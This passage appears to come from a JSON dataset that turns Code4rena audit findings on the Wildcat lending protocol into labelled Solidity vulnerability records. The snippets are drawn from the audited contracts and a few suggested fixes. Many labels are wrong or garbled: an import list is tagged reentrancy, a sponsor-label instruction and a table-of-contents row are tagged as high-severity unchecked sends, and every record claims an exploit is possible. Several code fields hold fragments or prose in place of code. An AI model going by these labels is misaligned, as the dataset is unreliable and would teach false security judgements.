    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketWithdrawals.sol#L194-L211 function executeWithdrawal( address accountAddress, uint32 expiry ) public nonReentrant sphereXGuardExternal returns (uint256) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.549,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\n  function executeWithdrawal(\n-    address accountAddress,\n    uint32 expiry\n  ) public nonReentrant sphereXGuardExternal returns (uint256) {\n    MarketState memory state = _getUpdatedState();\n    // Use an obfuscated constant for the base calldata size to prevent solc\n    // function specialization.\n    uint256 normalizedAmountWithdrawn = _executeWithdrawal(\n      state,\n-     accountAddress,\n+     msg.sender,\n      expiry,\n      _runtimeConstant(0x44)\n    );\n    // Update stored state\n    _writeState(state);\n    return normalizedAmountWithdrawn;\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Recommended Mitigation Steps",
    "description": "Apply some sort of access control to `WildcatMarketWithdrawals#executeWithdrawal()` by using `msg.sender` as the lender's address instead: function executeWithdrawal( -    address accountAddress, uint32 expiry ) public nonReentrant sphereXGuardExternal returns (uint256) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 21,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.564,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n\n  function setCredential(\n    LenderStatus memory status,\n    RoleProvider provider,\n    uint256 timestamp\n  ) internal pure {\n    // User is approved, update status with new expiry and last provider\n    status.lastApprovalTimestamp = uint32(timestamp);\n    status.lastProvider = provider.providerAddress();\n    status.canRefresh = provider.isPullProvider();\n  }\n\n  function unsetCredential(LenderStatus memory status) internal pure {\n    status.canRefresh = false;\n    status.lastApprovalTimestamp = 0;\n    status.lastProvider = address(0);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/types/LenderStatus.sol#L54-L70 function setCredential( LenderStatus memory status, RoleProvider provider, uint256 timestamp",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 19,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.556,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n  function transferFrom(\n    address from,\n    address to,\n    uint256 amount\n  ) external virtual nonReentrant sphereXGuardExternal returns (bool) {\n    uint256 allowed = allowance[from][msg.sender];\n\n    // Saves gas for unlimited approvals.\n    if (allowed != type(uint256).max) {\n      uint256 newAllowance = allowed - amount;\n      _approve(from, msg.sender, newAllowance);\n    }\n\n    _transfer(from, to, amount, 0x64);\n\n    return true;\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketToken.sol#L49-L66 function transferFrom( address from, address to, uint256 amount",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.457,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function transfer(\n    address to,\n    uint256 amount\n  ) external virtual nonReentrant sphereXGuardExternal returns (bool) {\n    _transfer(msg.sender, to, amount, 0x44);\n    return true;\n  }\n\n  function _transfer(address from, address to, uint256 amount, uint baseCalldataSize) internal virtual {\n    MarketState memory state = _getUpdatedState();\n    uint104 scaledAmount = state.scaleAmount(amount).toUint104();\n\n    if (scaledAmount == 0) revert_NullTransferAmount();\n\n    hooks.onTransfer(from, to, scaledAmount, state, baseCalldataSize);\n\n    Account memory fromAccount = _getAccount(from);\n    fromAccount.scaledBalance -= scaledAmount;\n    _accounts[from] = fromAccount;\n\n    Account memory toAccount = _getAccount(to);\n    toAccount.scaledBalance += scaledAmount;\n    _accounts[to] = toAccount;\n\n    _writeState(state);\n    emit_Transfer(from, to, amount);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "Protocol has both underlying  and market tokens. Lenders deposit underlying tokens and get market tokens, which earn interest. When they want to withdraw their assets, they will burn their market tokens and get the underlying tokens back with some interest. All of the internal accounting is made with these market tokens and they are tracked as scaled balances. Market tokens are minted and burned and these actions affect scaledTotalSupply. Market tokens can also be transferred between accounts like a regular ERC20 token. See https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketToken.sol#L41-L90 function transfer( address to, uint256 amount",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 29,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.881,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n\n  function totalAssets() public view returns (uint256) {\n    return asset.balanceOf(address(this));\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketBase.sol#L295-L300 function totalAssets() public view returns (uint256) { return asset.balanceOf(address(this)); } This function is used to get the total balance in underlying asset and it does this by querying the `balanceOf()` method, issue however is that not all ERC20 support the `balanceOf()`, for eg Aura stash tokens, which stalls adoption and make protocol unusable with these tokens.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.114,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nfunction deposit(uint256 amount) external virtual {\n  uint256 actualAmount = depositUpTo(amount);\n  // Remove the following check\n  // if (amount != actualAmount) { \n  //   revert MaxSupplyExceeded();\n  // }\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Recommended Mitigation Steps",
    "description": "Remove the redundant check in the `deposit()` function, as `depositUpTo()` already handles the maximum supply limit: function deposit(uint256 amount) external virtual { uint256 actualAmount = depositUpTo(amount); // Remove the following check // if (amount != actualAmount) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.219,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n  function closeMarket() external onlyBorrower nonReentrant sphereXGuardExternal {\n    MarketState memory state = _getUpdatedState();\n\n    if (state.isClosed) revert_MarketAlreadyClosed();\n\n    uint256 currentlyHeld = totalAssets();\n    uint256 totalDebts = state.totalDebts();\n    if (currentlyHeld < totalDebts) {\n      // Transfer remaining debts from borrower\n      uint256 remainingDebt = totalDebts - currentlyHeld;\n      _repay(state, remainingDebt, 0x04);\n      currentlyHeld += remainingDebt;\n    } else if (currentlyHeld > totalDebts) {\n      uint256 excessDebt = currentlyHeld - totalDebts;\n      // Transfer excess assets to borrower\n      asset.safeTransfer(borrower, excessDebt);\n      currentlyHeld -= excessDebt;\n    }\n    hooks.onCloseMarket(state);\n    state.annualInterestBips = 0;\n    state.isClosed = true;\n    state.reserveRatioBips = 10000;\n    // Ensures that delinquency fee doesn't increase scale factor further\n    // as doing so would mean last lender in market couldn't fully redeem\n    state.timeDelinquent = 0;\n\n    // Still track available liquidity in case of a rounding error\n    uint256 availableLiquidity = currentlyHeld -\n      (state.normalizedUnclaimedWithdrawals + state.accruedProtocolFees);\n\n    // If there is a pending withdrawal batch which is not fully paid off, set aside\n    // up to the available liquidity for that batch.\n    if (state.pendingWithdrawalExpiry != 0) {\n      uint32 expiry = state.pendingWithdrawalExpiry;\n      WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n      if (batch.scaledAmountBurned < batch.scaledTotalAmount) {\n        (, uint128 normalizedAmountPaid) = _applyWithdrawalBatchPayment(\n          batch,\n          state,\n          expiry,\n          availableLiquidity\n        );\n        availableLiquidity -= normalizedAmountPaid;\n        _withdrawalData.batches[expiry] = batch;\n      }\n    }\n\n    uint256 numBatches = _withdrawalData.unpaidBatches.length();\n    for (uint256 i; i < numBatches; i++) {\n      // Process the next unpaid batch using available liquidity\n      uint256 normalizedAmountPaid = _processUnpaidWithdrawalBatch(state, availableLiquidity);\n      // Reduce liquidity available to next batch\n      availableLiquidity -= normalizedAmountPaid;\n    }\n\n    if (state.scaledPendingWithdrawals != 0) {\n      revert_CloseMarketWithUnpaidWithdrawals();\n    }\n\n    _writeState(state);\n    emit_MarketClosed(block.timestamp);\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "Proof of Concept",
    "description": "First note that from the readMe, this has been stated: https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/README.md#L276 | [Blocklists](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#tokens-with-blocklists)                                                                | In scope    | Now, take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarket.sol#L226-L288 function closeMarket() external onlyBorrower nonReentrant sphereXGuardExternal { MarketState memory state = _getUpdatedState();",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 65,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function registerControllerFactory(address factory) external onlyOwner {\n    if (!_controllerFactories.add(factory)) {\n      revert ControllerFactoryAlreadyExists();\n    }\n    _addAllowedSenderOnChain(factory);\n    emit ControllerFactoryAdded(factory);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/WildcatArchController.sol#L245-L251 function registerControllerFactory(address factory) external onlyOwner { if (!_controllerFactories.add(factory)) { revert ControllerFactoryAlreadyExists(); }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.268,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function removeSanctionOverride(address account) public override {\n    sanctionOverrides[msg.sender][account] = false;\n    emit SanctionOverrideRemoved(msg.sender, account);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/WildcatSanctionsSentinel.sol#L104-L107 function removeSanctionOverride(address account) public override { sanctionOverrides[msg.sender][account] = false; emit SanctionOverrideRemoved(msg.sender, account); }",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.189,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function closeMarket() external onlyBorrower nonReentrant sphereXGuardExternal {\n    MarketState memory state = _getUpdatedState();\n\n    if (state.isClosed) revert_MarketAlreadyClosed();\n\n    //snip\n    hooks.onCloseMarket(state);\n    state.annualInterestBips = 0;\n    state.isClosed = true;\n    state.reserveRatioBips = 10000;\n    // Ensures that delinquency fee doesn't increase scale factor further\n    // as doing so would mean last lender in market couldn't fully redeem\n    // ..snip\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "See https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarket.sol#L226-L288 function closeMarket() external onlyBorrower nonReentrant sphereXGuardExternal { MarketState memory state = _getUpdatedState(); if (state.isClosed) revert_MarketAlreadyClosed(); //snip",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 17,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.506,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nimport './libraries/LibERC20.sol';\nimport './interfaces/IWildcatArchController.sol';\nimport './libraries/LibStoredInitCode.sol';\nimport './libraries/MathUtils.sol';\nimport './ReentrancyGuard.sol';\nimport './interfaces/WildcatStructsAndEnums.sol';\nimport './access/IHooks.sol';\nimport './IHooksFactory.sol';\nimport './types/TransientBytesArray.sol';\nimport './spherex/SphereXProtectedRegisteredBase.sol';\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Multiple instances in scope, for example take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/HooksFactory.sol#L4-L13 import './libraries/LibERC20.sol'; import './interfaces/IWildcatArchController.sol'; import './libraries/LibStoredInitCode.sol'; import './libraries/MathUtils.sol';",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.413,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "  /**\n   * @dev Saturation addition. Add `a` to `b` and return the result\n   *      if it is less than `maxValue` or `maxValue` if it overflows.\n   */\n  function satAdd(uint256 a, uint256 b, uint256 maxValue) internal pure returns (uint256 c) {\n    unchecked {\n      c = a + b;\n      return ternary(c < maxValue, c, maxValue);\n    }\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/types/RoleProvider.sol#L37-L42 function calculateExpiry( RoleProvider provider, uint256 timestamp ) internal pure returns (uint256) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.337,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\nThis function is used to know if the lender has a credential, issue however is that expired credentials would also return true for this check, considering the check here is against the ",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/types/LenderStatus.sol#L36-L38 function hasCredential(LenderStatus memory status) internal pure returns (bool) { return status.lastApprovalTimestamp > 0; } This function is used to know if the lender has a credential, issue however is that expired credentials would also return true for this check, considering the check here is against the `lastApprovalTimestamp` being more than `0`, but when granting the credential the `lastApprovalTimestamp` is set to non-zero.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.187,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nNow contracts are being compiled with versions higher than `0.8.20` see https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/types/TransientBytesArray.sol#L1-L5\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "Per the readMe protocol is to also deploy on multiple optimistic chains see:<br> https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/README.md#L254 | Chains the protocol will be deployed on | Ethereum, Base, Arbitrum, Polygon | Now contracts are being compiled with versions higher than `0.8.20` see https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/types/TransientBytesArray.sol#L1-L5 // SPDX-License-Identifier: MIT",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.205,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "sponsor acknowledged",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "1a. Label as one of the following:",
    "description": "- `sponsor confirmed`, meaning: \"Yes, this is a problem and we intend to fix it.\" - `sponsor disputed`, meaning either: \"We cannot duplicate this issue\" or \"We disagree that this is an issue at all.\" - `sponsor acknowledged`, meaning: \"Yes, technically the issue is correct, but we are not going to resolve it for xyz reasons.\" Add any necessary comments explaining your rationale for your evaluation of the issue. Note: Adding or changing labels other than those in this list will be automatically reverted by our bot, which will note the change in a comment on the issue.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.02,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "WildcatMarketWithdrawals#executeWithdrawal()",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "Table of Contents",
    "description": "| Issue ID | Description | | -------- | ----------- | | [QA-01](#qa-01-market-can-immediately-fall-into-delinquency) | Market can immediately fall into delinquency | | [QA-02](#qa-02-use-a-pull-pattern-instead-of-push-when-collecting-fees) | Use a pull pattern instead of push when collecting fees | | [QA-03](#qa-03-borrowers-would-pay-lesser-apr-in-some-supported-assets) | Borrowers would pay lesser APR in some supported assets |",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.044,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n\n  function enforceParameterConstraints(\n    uint16 annualInterestBips,\n    uint16 delinquencyFeeBips,\n    uint32 withdrawalBatchDuration,\n    uint16 reserveRatioBips,\n    uint32 delinquencyGracePeriod\n  ) internal view virtual {\n//snip\n    assertValueInRange(\n      reserveRatioBips,\n      MinimumReserveRatioBips,\n      MaximumReserveRatioBips,\n      ReserveRatioBipsOutOfBounds.selector\n    );\n    assertValueInRange(\n      delinquencyGracePeriod,\n      MinimumDelinquencyGracePeriod,\n      MaximumDelinquencyGracePeriod,\n      DelinquencyGracePeriodOutOfBounds.selector\n    );\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "First note that the protocol allows borrowers to set a reserve ratio that they must maintain to avoid being charged a delinquency fee. Now, see https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/access/MarketConstraintHooks.sol#L44-L45 uint16 internal constant MaximumReserveRatioBips = 10_000; From here we can see that the maximum acceptable value for this is `10_000`. Now when creating the market, this is called: https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/access/MarketConstraintHooks.sol#L136-L150",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 24,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.594,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function collectFees() external nonReentrant sphereXGuardExternal {\n    MarketState memory state = _getUpdatedState();\n    if (state.accruedProtocolFees == 0) revert_NullFeeAmount();\n\n    uint128 withdrawableFees = state.withdrawableProtocolFees(totalAssets());\n    if (withdrawableFees == 0) revert_InsufficientReservesForFeeWithdrawal();\n\n    state.accruedProtocolFees -= withdrawableFees;\n    asset.safeTransfer(feeRecipient, withdrawableFees);\n    _writeState(state);\n    emit_FeesCollected(withdrawableFees);\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "Proof of Concept",
    "description": "First note that from the readMe, this has been stated: https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/README.md#L276 | [Blocklists](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#tokens-with-blocklists)                                                                | In scope    | Now, take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarket.sol#L125-L137 function collectFees() external nonReentrant sphereXGuardExternal { MarketState memory state = _getUpdatedState();",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.53,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "markdown\n| [Balance changes outside of transfers](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#balance-modifications-outside-of-transfers-rebasingairdrops) | In scope    |\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "First, per the readMe, we should assume rebasing tokens are in scope, see https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/README.md#L262 | [Balance changes outside of transfers](https://github.com/d-xo/weird-erc20?tab=readme-ov-file#balance-modifications-outside-of-transfers-rebasingairdrops) | In scope    | Where as this integration is welcome as the WIldMarketTokens themselves are somewhat rebasing in nature, this then means that users could pay lesser APR, which is because if they are used as underlying assets for markets, when the borrower/market contracts hold these tokens while they are lent, the newly accrued tokens may either be credited to the borrower, or inside the market itself, which in our case would count as the borrower adding liquidity. And result in the borrower _needing_ to pay a lower Annual Percentage Rate (APR) than initially set.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.182,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function _transfer(address from, address to, uint256 amount, uint baseCalldataSize) internal virtual {\n    MarketState memory state = _getUpdatedState();\n    uint104 scaledAmount = state.scaleAmount(amount).toUint104();\n\n    if (scaledAmount == 0) revert_NullTransferAmount();\n\n    hooks.onTransfer(from, to, scaledAmount, state, baseCalldataSize);\n\n    Account memory fromAccount = _getAccount(from);\n    fromAccount.scaledBalance -= scaledAmount;\n    _accounts[from] = fromAccount;\n\n    Account memory toAccount = _getAccount(to);\n    toAccount.scaledBalance += scaledAmount;\n    _accounts[to] = toAccount;\n\n    _writeState(state);\n    emit_Transfer(from, to, amount);\n  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketToken.sol#L72-L91 function _transfer(address from, address to, uint256 amount, uint baseCalldataSize) internal virtual { MarketState memory state = _getUpdatedState(); uint104 scaledAmount = state.scaleAmount(amount).toUint104(); if (scaledAmount == 0) revert_NullTransferAmount();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.687,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n  function _getUpdatedState() internal returns (MarketState memory state) {\n    state = _state;\n    // Handle expired withdrawal batch\n    if (state.hasPendingExpiredBatch()) {\n      uint256 expiry = state.pendingWithdrawalExpiry;\n      // Only accrue interest if time has passed since last update.\n      // This will only be false if withdrawalBatchDuration is 0.\n      uint32 lastInterestAccruedTimestamp = state.lastInterestAccruedTimestamp;\n      if (expiry != lastInterestAccruedTimestamp) {\n        (uint256 baseInterestRay, uint256 delinquencyFeeRay, uint256 protocolFee) = state\n          .updateScaleFactorAndFees(\n            delinquencyFeeBips,\n            delinquencyGracePeriod,\n            expiry\n          );\n          //snip\n      }\n          //snip\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "Proof of Concept",
    "description": "Take a look at https://github.com/code-423n4/2024-08-wildcat/blob/fe746cc0fbedc4447a981a50e6ba4c95f98b9fe1/src/market/WildcatMarketBase.sol#L406-L465 function _getUpdatedState() internal returns (MarketState memory state) { state = _state; // Handle expired withdrawal batch if (state.hasPendingExpiredBatch()) {",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 21,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.779,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n\n  function releaseEscrow() public override {\n    if (!canReleaseEscrow()) revert CanNotReleaseEscrow();\n\n    uint256 amount = balance();\n    address _account = account;\n    address _asset = asset;\n\n    asset.safeTransfer(_account, amount);\n\n    emit EscrowReleased(_account, _asset, amount);\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Proof of Concept",
